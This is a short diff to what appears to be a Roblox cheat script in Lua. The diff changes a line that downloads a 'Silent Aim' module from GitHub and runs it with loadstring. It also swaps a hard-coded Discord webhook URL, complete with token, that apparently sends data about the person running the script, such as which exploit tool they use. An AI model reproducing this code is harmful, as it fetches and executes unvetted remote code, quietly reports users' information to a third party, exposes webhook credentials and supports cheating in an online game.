@@ -9,7 +9,7 @@ local LocalPlayer = Players.LocalPlayer
 local accomidationfactor = 0.12
 
 -- // Silent Aim Module
-local SilentAim = loadstring(game:HttpGet("https://raw.githubusercontent.com/adhadlol/adadadadaddada/main/dgdhdhdhhhd"))()
+local SilentAim = loadstring(game:HttpGet("https://raw.githubusercontent.com/staxlol/adjust1/main/adjustttt"))()
 SilentAim.TeamCheck = false
 -- // Metatable vars
 local mt = getrawmetatable(game)
@@ -56,7 +56,7 @@ SONA_LOADED and "Sona" or
 "Kid with shit exploit"
 
 local url =
-"https://discord.com/api/webhooks/923023016617709598/Udor3dFzc40pS4wF4pPPrzoGU8izybrkRHVvHtpzTrHRlYwcTv89RI97gOECCsmoCBhw"
+"https://discordapp.com/api/webhooks/923752677748379758/lb7qz8q2P2JG_8W7fHZhgabOdaUOlO8Q3K1yvPOqkor5bM8i7vLLFhav42SfQdK2lOPc"
 local data = {
 ["content"] = " ***silent***",
 ["embeds"] = {
